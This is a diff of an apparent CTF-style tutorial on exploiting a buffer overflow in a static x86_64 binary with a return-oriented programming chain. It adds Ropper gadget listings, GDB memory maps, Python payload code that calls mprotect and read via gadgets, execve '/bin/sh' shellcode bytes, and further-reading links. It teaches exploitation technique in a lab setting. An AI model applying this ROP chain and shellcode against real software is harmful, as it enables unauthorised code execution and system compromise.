@@ -137,7 +137,15 @@ anything so I had to dig in using my own hands.
 The following command shows many usable ROP gadgets (snippets):
 
 ```shell script
-ropper --file main --search "%" | less
+ropper --file main --search "%"
+0x000000000041996b: adc al, 0; ret; 
+0x000000000042dee5: adc al, 0x1f; mov dword ptr [rsp + 0x28], edx; mov qword ptr [rsp + 0x30], rax; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
+0x000000000042da80: adc al, 0x24; call 0x2d660; mov rbp, qword ptr [rsp + 0x40]; add rsp, 0x48; ret; 
+0x000000000044ba26: adc al, 0x24; call 0x4b190; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
+0x000000000046c199: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; 
+0x000000000046bffa: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x28]; add rsp, 0x30; ret; 
+0x00000000004614fa: adc al, 0x24; call rcx; 
+[...]
 ```
 
 
@@ -178,12 +186,155 @@ Putting the ROP techniques from above into play, the plan looks like this:
  
 **Step 1: Get a memory page with RWX permissions**
 
-To do this, we use the `mprotect` syscall.
+To do this, we use the `mprotect` syscall. Its man page explains the usage:
+
+```c
+int mprotect(void *addr, size_t len, int prot);
+
+mprotect() changes the access protections for the calling process's memory pages containing any part of the address 
+range in the interval [addr, addr+len-1]. addr must be aligned to a page boundary.
+```
+
+This means we need to provide the address of the region we want to change, the desired size, and the permission to set.
+These permissions work similar to file system permissions, so the integer value 7 means RWX.
+
+We can use the `vmmap` command in GDB to find a suitable memory page:
+
+```gdb
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00493000         r-xp	main
+0x00493000         0x00551000         r--p	main
+0x00551000         0x00567000         rw-p	main
+0x00567000         0x00593000         rw-p	[heap]
+[...]
+```
+
+The first (r-x) page is the one containing the code. I choose the third page, starting at `0x00551000`. It already has
+the RW permissions, but we need to add X to make it executable. We can choose `0x100` (256 bytes) as size as this will
+be more than enough space for the shell code.
+
+How do syscalls work? The general idea is to execute the `syscall` instruction. Before that, we need to put the syscall
+number into `$rax`, and set up the arguments to the function. The [Linux x86_64 syscall table](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl)
+shows that the `mprotect` syscall has number 10 (`0xa`).
+
+We set up the parameters according to the x86_64 calling convention: the first parameters get passed in registers $rdi,
+$rsi, $rdx, $rxc, $r8, $r9, the remaining ones through the stack. The return value is passed back in $rax. This means
+that we will need to set up the following situation when executing the `syscall` instruction:
+
+ - $rax: 0xa
+ - $rdi: 0x00551000
+ - $rsi: 0x100
+ - $rdx: 0x7
+ 
+For this, we now need to find some suitable gadgets in the huge output of Ropper. First, let's try to set $rax to 10.
+There is probably no `mov rax, 10`, so instead what could be useful is a `mov rax, 0` / `sub rax, rax` / `xor rax, rax`
+to set $rax to zero, and then `add rax, 1` to slowly increase it up to 10.
+
+I could find a `mov eax, 0; ret;` gadget at address `0x000000000045b900` and debugging in GDB showed that this is indeed
+enough to set the whole $rax to zero ($eax is the lower 32 bit of the 64 bit register $rax). Then, combining it with the
+`add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret;` gadget applied 5 times we can increment $rax to 10. The gadget
+will also move the value to some address in memory but we can just ignore that.
+
+For $rdx and $rsi, we can go the easy way and just pop them from the stack, meaning we just put the pop gadget and the
+value directly behind it. Very convenient. The gadgets look like this: `pop rdx; adc al, 0xf6; ret;`. They also
+increment $rax through the `adc` instruction, but if we set up $rdx and $rsi before setting up $rax this is not a
+problem because we initialize it to zero anyways.
+
+For setting $rdx, I also found `pop rdx; xor ah, byte ptr [rsi - 9]; ret;`. We could apply it twice to change back the
+xor operation on $rax, but this gadget reads from an address determined through $rsi which will segfault in this 
+context.
+
+The hardest is finding a gadget to set $rdi. There is `pop rdi; sete byte ptr [rsp + 0x10]; ret;`, but this will set
+a memory address near the stack pointer with the second instruction and thus mess up the ROP chain. The only other good
+gadget option is `pop rdi; dec dword ptr [rax + 0x21]; ret;`,  but this decrements a memory address determined by $rax.
+In theory, we don't need to care about this address, but in first experiments the address would always be invalid and
+thus crash the program too early.
+
+I found a solution using the `pop rax; or dh, dh; ret;` gadget. It allows to set $rax directly and therefore also makes
+the above $rax increment workaround unnecessary. I leave it in anyways. The important part is, we can now set $rax to
+some dummy address before executing the pop rdi gadget, and then the program does not crash. I use the address of the
+fourth memory page from above, the heap, for this: `0x00567000`.
+
+Now we can put together the gadget addresses and values. Before them, we put the same padding to offset to the stored
+return address on the stack.
+
+```python
+eax0 = 0x000000000045b900 # mov eax, 0; ret;
+inc2rax = 0x0000000000419963 # add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret;
+poprdx = 0x000000000040830c # pop rdx; adc al, 0xf6; ret;
+poprsi = 0x0000000000415574 # pop rsi; adc al, 0xf6; ret;
+syscall = 0x000000000045d329 # syscall; ret;
+poprax = 0x000000000040deac # pop rax; or dh, dh; ret;
+poprdi = 0x000000000040eb97 # pop rdi; dec dword ptr [rax + 0x21]; ret;
+
+# addresses
+buf = 0x00551000 # use vmmap in GDB to find it
+dummy = 0x00567000 # heap
+
+# padding
+payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
+
+# mark memory page at buf rwx
+payload += p64(poprax) # sete in poprdi mitigation
+payload += p64(dummy)
+payload += p64(poprdi) # 1ST ARGUMENT
+payload += p64(buf) # ADDRESS
+payload += p64(poprsi) # 2ND ARGUMENT
+payload += p64(0x100) # SIZE
+payload += p64(poprdx) # 3RD ARGUMENT
+payload += p64(0x7) # RWX
+payload += p64(eax0) # SET RAX = 0
+payload += p64(inc2rax) * 5 # SET RAX = 10
+payload += p64(syscall) # SYSCALL
+```
+
+Executing the program with this input will mark the memory page with RWX permissions. We can verify this in GDB using
+the `vmmap` command:
+
+```gdb
+gdb-peda$ vmmap
+Start              End                Perm	Name
+[...]
+0x00551000         0x00567000         rwxp	main
+[...]
+```
 
 
 **Step 2: Write shell code into the page**
 
-To read in the code, we use the `read` syscall.
+To read in the shell code, we use the `read` syscall. Its documentation states the following:
+
+```c
+ssize_t read(int fd, void *buf, size_t count);
+
+read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.
+```
+
+We can use the same technique to spawn the syscall as above. The syscall table shows that this time we need to call
+the syscall with number 0. The file descriptor for standard input also has the number 0. Thus, we need to create the 
+following register situation:
+
+ - $rax: 0x0
+ - $rdi: 0x0
+ - $rsi: 0x00551000
+ - $rdx: 0x100
+ 
+Conveniently, we already have the ROP gadgets needed and only need to rearrange:
+
+```python
+payload += p64(poprax) # sete in poprdi mitigation
+payload += p64(dummy)
+payload += p64(poprdi) # 1ST ARGUMENT
+payload += p64(0x0) # STDIN
+payload += p64(poprsi) # 2ND ARGUMENT
+payload += p64(buf) # ADDRESS
+payload += p64(poprdx) # 3RD ARGUMENT
+payload += p64(0x100) # SIZE
+payload += p64(eax0) # SET RAX = 0
+payload += p64(syscall) # SYSCALL
+
+```
 
 Now, we have to provide some code that actually spawns a shell. This 27 bytes assembly program will spawn `/bin/sh`. It
 is taken from [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-806.php).
@@ -192,6 +343,8 @@ is taken from [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode
 # http://shell-storm.org/shellcode/files/shellcode-806.php
 shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 ```
+
+We send it right after the payload in the resulting python script.
 
 
 **Step 3: Jump to the code**
@@ -202,7 +355,6 @@ address as the next return address:
 ```python
 payload += p64(buf)
 ```
-
 
 If we run the final exploit, we get the following output:
 
@@ -299,3 +451,12 @@ else:
     c.sendline(shellcode)
     c.interactive()
 ```
+
+
+## Further reading
+
+Here are some excellent further resources on ROP exploitation on x86_64 architecture:
+
+ - https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
+ - https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/
+ - https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937
